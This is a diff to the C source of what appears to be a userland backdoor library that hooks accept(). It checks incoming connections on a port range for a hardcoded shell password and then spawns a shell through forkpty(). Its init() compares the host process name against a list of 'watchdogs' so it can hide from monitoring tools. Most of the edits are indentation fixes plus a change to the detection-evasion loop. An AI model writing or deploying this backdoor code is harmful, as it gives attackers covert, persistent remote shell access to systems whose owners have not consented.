@@ -56,10 +56,13 @@ void init(void)
 
     if((handle = fopen("/proc/self/cmdline", "r")))
     {
-        while(getdelim(&caller, &len, 0, handle) != -1 && !wd_found)
+        while(getdelim(&caller, &len, 0, handle) != -1)
         {
             if(watchdog(caller))
+            {
                 // Unload the library.
+                break;
+            }
         }
 
         free(caller);
@@ -87,7 +90,7 @@ void drop_shell(int fd)
     char pty_name[13];    // /proc/sys/kernel/pty/max generally <= 4 chars.
     char *test = "echo 123 > /tmp/456.txt\n";
 
-	debug("drop_shell(): forkpty() called.\n");
+    debug("drop_shell(): forkpty() called.\n");
     pid = forkpty(&master, pty_name, NULL, NULL);
 
     dprintf(fd, "Master FD: %d\n", master);
@@ -100,7 +103,7 @@ void drop_shell(int fd)
         // dup2(master, STDOUT_FILENO);
         // dup2(master, STDERR_FILENO);
 
-    	debug("drop_shell(): dropping shell.\n");
+        debug("drop_shell(): dropping shell.\n");
         execv(argv[0], argv);
     }
     else if(pid > 0)
@@ -148,7 +151,7 @@ int watchdog(char *name)
     {
         if(strcmp(watchdogs[i], name) == 0)
         {
-        	debug("watchdog(): busted (%s).\n", name);
+            debug("watchdog(): busted (%s).\n", name);
             return true;
         }
     }
@@ -204,7 +207,7 @@ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
 
     if(port >= LOW_PORT && port <= HIGH_PORT)
     {
-    	debug("accept(): ready for password: ");
+        debug("accept(): ready for password: ");
         read(retfd, password, pass_len);
 
         if(strcmp(password, SHELL_PASS) == 0)
